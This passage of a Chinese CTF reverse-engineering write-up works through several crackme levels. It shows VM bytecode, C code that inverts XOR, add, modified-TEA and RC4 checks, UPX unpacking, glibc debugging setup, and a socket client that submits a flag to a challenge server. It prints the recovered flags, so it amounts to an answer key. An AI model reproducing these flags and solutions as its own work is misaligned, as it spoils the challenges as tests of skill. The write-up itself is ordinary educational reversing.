class="number">4</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">2</span> A					add reg62, [esp + a]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">3F</span> <span class="number">3</span>				mov reg63, reg3</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">3</span> <span class="number">3</span>D				add reg63, reg61</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">40</span> <span class="number">3</span>				mov reg64, reg3</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">9</span>	<span class="number">40</span> <span class="number">5</span>				shr reg64, <span class="number">5</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">4</span> B					add reg64, [esp + <span class="number">9</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b	<span class="number">3</span>E <span class="number">3F</span>				xor reg62, reg63</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b	<span class="number">3</span>E <span class="number">40</span>				xor reg62, reg64</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">2</span> <span class="number">2</span>					add reg62, reg2</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">2</span> <span class="number">3</span>E				mov reg2 reg62</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">//v3</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">3</span>E <span class="number">2</span>				mov reg62, reg2</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">8</span>	<span class="number">3</span>E <span class="number">4</span>				shl reg62, <span class="number">4</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">2</span> C					add reg62, [esp + <span class="number">8</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">3F</span> <span class="number">2</span>				mov reg63, reg2</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">3</span> <span class="number">3</span>D				add reg63, reg61</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">40</span> <span class="number">2</span>				mov reg64, reg2</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">9</span>	<span class="number">40</span> <span class="number">5</span>				shr reg64, <span class="number">5</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">4</span> D					add reg64, [esp + <span class="number">7</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b	<span class="number">3</span>E <span class="number">3F</span>				xor reg62, reg63</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b	<span class="number">3</span>E <span class="number">40</span>				xor reg62, reg64</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">2</span> <span class="number">3</span>					add reg62, reg3</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">3</span> <span class="number">3</span>E				mov reg3,  reg62</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">11</span>	<span class="number">0</span> <span class="number">1</span>					add reg60, <span class="number">1</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">e	<span class="number">0</span> <span class="number">20</span>				cmp reg60, <span class="number">32</span>			</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">c	<span class="number">55</span>					jnz	tag2</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">---</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">f	<span class="number">13</span>					pop delta</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">10</span>						retn</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">---</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<p>没实现栈平衡，不过芜锁胃；反正最后return回去输出就行；</p>
<p>注意：写二进制文件时用小端序，而且以DWORD为基本单位，并以3个DWORD对齐，比如 <code>c 55</code> 写成：<code>0c 00 00 00 55 00 00 00 00 00 00 00</code> ;</p>
<p>还有个问题，根据调试，每次第一条指令开始是code[8] = 3C; 所以二进制文件需要填充垃圾信息，填多少？第一幅图中instru = code[3 * code[8] + 1010], 所以 括号里的内容为 ： 1190 ；而写二进制文件需要以DWORD为单位，所以需要填充 1190 * 4 个 00 ；</p>
<p>通过：</p>
<p><img src="https://s2.loli.net/2022/10/31/p5qd2NZMrHelwa3.png" alt="pass"></p>
<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>ida：</p>
<p><img src="https://s2.loli.net/2022/11/01/X83ejBp4Tx6KRGE.png" alt="main"></p>
<p>调试可以发现main挂不上，然后就发现旁边的函数长得和main都差不多，一个一个断点试，找到第三个是真正的main函数；</p>
<p>主要思路就是输入15个内容，进行异或和加运算，然后和v4开始的数据比较；</p>
<p>写出逆运算：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> buf[<span class="number">15</span>] = &#123;</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0x46</span>, <span class="number">0x81</span>, <span class="number">0x63</span>, <span class="number">0x14</span>, <span class="number">0x53</span>, <span class="number">0x17</span>, <span class="number">0x6D</span>, <span class="number">0x6A</span>, <span class="number">0x67</span>, <span class="number">0x76</span>, <span class="number">0x16</span>, <span class="number">0x34</span>, <span class="number">0x14</span>, <span class="number">0x34</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> v0 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> ans[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">14</span>; ++i)	<span class="comment">//自加v0到加密完状态</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= <span class="number">2</span>; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            v0++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v0--;		<span class="comment">//多加一个减掉</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">14</span>; i &gt;= <span class="number">0</span>; --i)		<span class="comment">//逆</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">2</span>; j &gt;= <span class="number">0</span>;--j)</span><br><span class="line">        &#123;</span><br><span class="line">            buf[i] -= v0--;</span><br><span class="line">            buf[i] ^= i ^ j ^ <span class="number">0x32</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ans[i] = buf[i];</span><br><span class="line">    &#125;</span><br><span class="line">    ans[<span class="number">15</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, ans);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到flag：<strong>SYC{0h_y0u1_finD0V0}</strong></p>
<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>ida：</p>
<p><img src="https://s2.loli.net/2022/11/01/sXh8FmTYcDK6bUw.png" alt="main"></p>
<p>进去之后第一感觉会发现main是个scanf函数，但是点进去之后会发现这个东西，让调试才能查看代码；点进这个函数之后会发现是个线程创建，注意调试时改变if判断的变量值为1；</p>
<p>在线程中可以发现以下代码：</p>
<p><img src="https://s2.loli.net/2022/11/01/fKCjik9e7dcswoZ.png" alt="thread"></p>
<p>在thread main 函数里有两个函数：check() 和 encrypt() ；</p>
<p>check一开始就执行，判断长度，以及输入的内容必须为数字；</p>
<p>encrypt读入key和输入的数据，将数据前12位与key加密运算；</p>
<p>最后比较数据；</p>
<p>写出encrypt的逆向算法：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">12</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span> (key[i])</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            v4 += <span class="number">23</span>;		<span class="comment">//无用</span></span><br><span class="line">            v3 ^= <span class="number">5</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            us[i] ^= key[i];	<span class="comment">//不变</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">161</span>:</span><br><span class="line">            us[i] -= <span class="number">2</span> * key[i];		<span class="comment">//减等</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">196</span>:</span><br><span class="line">            us[i] -= <span class="number">10</span>;		<span class="comment">//减等</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">229</span>:</span><br><span class="line">            <span class="comment">//v3 = 8 * ((v4 + 6) &gt;&gt; (v4 &amp; 3));		无用</span></span><br><span class="line">            us[i] = <span class="built_in">inter</span>(us[i]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inter</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a - <span class="number">0x19</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将比较数据经过以上运算得到flag：<strong>SYC{03062639056784}</strong></p>
<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>ida进去可以发现是加壳了，函数很少；</p>
<p>打开二进制格式搜索upx，果然就找到了老朋友：</p>
<p><img src="https://s2.loli.net/2022/11/01/4qWFzD8ngvBEXOl.png" alt="unpack"></p>
<p>upx加壳的标识码是 UPX! 全大写，拿不准改哪个就全部 Upx 都改成 UPX；</p>
<p>改完就可以脱壳了；</p>
<p>看代码：</p>
<p><img src="https://s2.loli.net/2022/11/01/OoUJV9mjlkSLMs1.png" alt="main"></p>
<p>看不懂子进程作用，反正主要内容在父进程里：输入内容后，先进入change函数，把4个4个的char内容放到4单位的int里；然后把这个int数组放到xor函数里，把每个字节都和j做异或运算，最后和v19比较数据，v19的内容就是cpy的16长度的字符串；</p>
<p>异或的逆运算还是异或，写出复原代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i = i + <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            we[i] = we[i] ^ j;</span><br><span class="line">            we[i + <span class="number">1</span>] = we[i + <span class="number">1</span>] ^ (j + <span class="number">1</span>); </span><br><span class="line">            we[i + <span class="number">2</span>] = we[i + <span class="number">2</span>] ^ (j + <span class="number">2</span>);</span><br><span class="line">            we[i + <span class="number">3</span>] = we[i + <span class="number">3</span>] ^ (j + <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>将逆向得到的cpy字符串带入we得到flag：<strong>SYC{0k_y0u_s0lv3_it_}</strong></p>
<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>这道题缺库不能调，直接看静态；</p>
<p>ida:</p>
<p><img src="https://s2.loli.net/2022/11/01/JosKVDhp8uG6CzZ.png" alt="main"></p>
<p>左图main函数，右图rc4函数，将enter用rc4加密了,密钥是 <code>syclover:)</code>；</p>
<p>使用大厨把enter加密后的内容烤出来：（<a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/">CyberChef (gchq.github.io)</a>）</p>
<p><img src="https://s2.loli.net/2022/11/01/eG14IYzog8ibysc.png" alt="chef"></p>
<p>发现开头是ELF，说明这加密出来的内容是个elf文件，将其写入二进制文件再用ida打开：</p>
<p><img src="https://s2.loli.net/2022/11/02/AUOTdGoit1JLp3c.png" alt="main"></p>
<p>属于就正常了；</p>
<p><img src="https://s2.loli.net/2022/11/02/JItDwv6UbOjHkKZ.png" alt="func"></p>
<p>如上可知，输入16长度内容，然后进行tea算法(小魔改，每次异或了i)，之后比较数据；</p>
<p>写出逆算法：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>  j = <span class="number">0</span>,l , r ,sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> v[<span class="number">4</span>] = &#123; <span class="number">0x6A318EC6</span> , <span class="number">0x5B898EC2</span> , <span class="number">0x42FB5DD1</span> , <span class="number">0x50AC4C5F</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> k[<span class="number">4</span>] = &#123;<span class="number">0x11</span> , <span class="number">0x22</span> , <span class="number">0x33</span> , <span class="number">0x44</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (j &lt; <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">	l = v[j];</span><br><span class="line">	r = v[j+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">		sum += DELTA;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">31</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">	&#123;</span><br><span class="line">		r -= (k[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum) ^ (((l &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * l)) + l) ^ i;</span><br><span class="line">		sum -= DELTA;</span><br><span class="line">		l -= (k[sum &amp; <span class="number">3</span>] + sum) ^ (((r &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * r)) + r) ^ i;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	v[j] = l;</span><br><span class="line">	v[j + <span class="number">1</span>] = r;</span><br><span class="line"></span><br><span class="line">	sum = <span class="number">0</span>;</span><br><span class="line">	j += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* p;</span><br><span class="line">p = (<span class="keyword">char</span> *)v;</span><br><span class="line">p[<span class="number">16</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, p);</span><br></pre></td></tr></table></figure>

<p>得到flag：<strong>SYC{w3f-2hs-ij7-9is}</strong></p>
<h3 id="调试GLIBC-2-34小技巧"><a href="#调试GLIBC-2-34小技巧" class="headerlink" title="调试GLIBC_2.34小技巧"></a>调试GLIBC_2.34小技巧</h3><h4 id="安装glibc-all-in-one"><a href="#安装glibc-all-in-one" class="headerlink" title="安装glibc-all-in-one"></a>安装glibc-all-in-one</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo git clone https://github.com/matrix1001/glibc-all-in-one.git </span><br><span class="line">cd glibc-all-in-one/</span><br><span class="line">sudo python3 update_list</span><br></pre></td></tr></table></figure>

<p>下载glibc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./download 2.35-0ubuntu3_amd64</span><br></pre></td></tr></table></figure>



<h4 id="安装patchelf"><a href="#安装patchelf" class="headerlink" title="安装patchelf"></a>安装patchelf</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/NixOS/patchelf.git</span><br><span class="line">cd patchelf</span><br><span class="line">sudo apt-get install autoconf automake libtool</span><br><span class="line">./bootstrap.sh </span><br></pre></td></tr></table></figure>

<p>继续：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>



<h4 id="配置ld-so"><a href="#配置ld-so" class="headerlink" title="配置ld.so"></a>配置ld.so</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter path/to/.so the/elf/you/debug</span><br></pre></td></tr></table></figure>



<h4 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-rpath path/to/.so the/elf/you/debug</span><br></pre></td></tr></table></figure>



<h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><blockquote>
<p>逆向一个CPP服务器，得到flag，并编写socket客户端和远程服务器提交flag;</p>
</blockquote>
<h3 id="逆"><a href="#逆" class="headerlink" title="逆"></a>逆</h3><p>ida查看服务器：</p>
<p><img src="https://s2.loli.net/2022/11/03/TcL4DovPZhJQiCK.png" alt="main"></p>
<p>这是一个服务端框架，首先创建套接字类型文件，并返回fd文件饰描述符；</p>
<p>然后和IP端口进行绑定；</p>
<p>之后一直监听这个端口，直到接收客户端请求，执行处理，并且是多线程的处理；</p>
<p>而处理的主体在 CTask_server 里可以找到：</p>
<p><img src="https://s2.loli.net/2022/11/03/5fXqzLwCBQjFG74.png" alt="true"></p>
<p>先发送 “Please …” (send) 到客户端，然后等待输入，被inside变量接收，之后进入cc加密，和tt生成的v7进行比较数据；</p>
<p>看看里面加密吧，都tea ptsd了，不想放图了；直接来吧：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>  j = <span class="number">0</span>, l, r, sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> v[<span class="number">3</span>] = &#123; <span class="number">0xED3E9980</span> , <span class="number">0x57284856</span> ,<span class="number">0</span> &#125;;		<span class="comment">//从tt里抄的</span></span><br><span class="line"><span class="keyword">int</span> k[<span class="number">4</span>] = &#123; <span class="number">0x6C</span> , <span class="number">0x30</span> , <span class="number">0x76</span> , <span class="number">0x33</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l = v[<span class="number">0</span>];</span><br><span class="line">r = v[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">	sum += DELTA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">31</span>; i &gt;= <span class="number">0</span>; --i)		<span class="comment">//小魔改tea</span></span><br><span class="line">&#123;</span><br><span class="line">	r -= ((l &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]) ^ (l + sum) ^ (<span class="number">16</span> * l + k[<span class="number">2</span>]) ^ i;</span><br><span class="line">	l -= ((r &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]) ^ (r + sum) ^ (<span class="number">16</span> * r + k[<span class="number">0</span>]) ^ i;</span><br><span class="line">	sum -= DELTA;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v[<span class="number">0</span>] = l;</span><br><span class="line">v[<span class="number">1</span>] = r;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* p = (<span class="keyword">char</span>*)v;</span><br><span class="line">p[<span class="number">9</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, p);</span><br></pre></td></tr></table></figure>

<p>得到flag：<strong>D0Y0uKSk</strong></p>
<h3 id="写"><a href="#写" class="headerlink" title="写"></a>写</h3><p>如同服务端，自己写的客户端也需要一个框架，然后把发送的flag放到主体里就行；</p>
<p>根据题目中的链接，可以知道客户端只需要使用socket创建套接字后通过ip端口连接就行；</p>
<p>那么大概的框架就是： socket() -&gt; 结构地址 -&gt; connect() 连接到地址 -&gt; 读 &amp; 写 -&gt; close() 结束;</p>
<p>内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Client Start\n&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> fd = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>);               <span class="comment">//逆向得到的参数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> lines[] = <span class="string">&quot;D0Y0uKSk&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>;</span>               <span class="comment">//套接字结构地址</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;serv_addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line">    serv_addr.sin_family = AF_INET;             <span class="comment">//IPv4</span></span><br><span class="line">    serv_addr.sin_addr.s_addr = inet_addr(<span class="string">&quot;1.14.92.115&quot;</span>);   <span class="comment">//地址</span></span><br><span class="line">    serv_addr.sin_port = htons(<span class="number">1234</span>);           <span class="comment">//端口</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Connecting..\n&quot;</span>);</span><br><span class="line">    connect(fd, (struct sockaddr*)&amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr));   <span class="comment">//接通accept</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Done !\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">40</span>];       				 	<span class="comment">//回响容器</span></span><br><span class="line">    read(fd, buffer, <span class="keyword">sizeof</span>(buffer) - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, lines);</span><br><span class="line">    write(fd, lines, <span class="keyword">sizeof</span>(lines) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    read(fd, buffer, <span class="keyword">sizeof</span>(buffer) - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line"></span><br><span class="line">    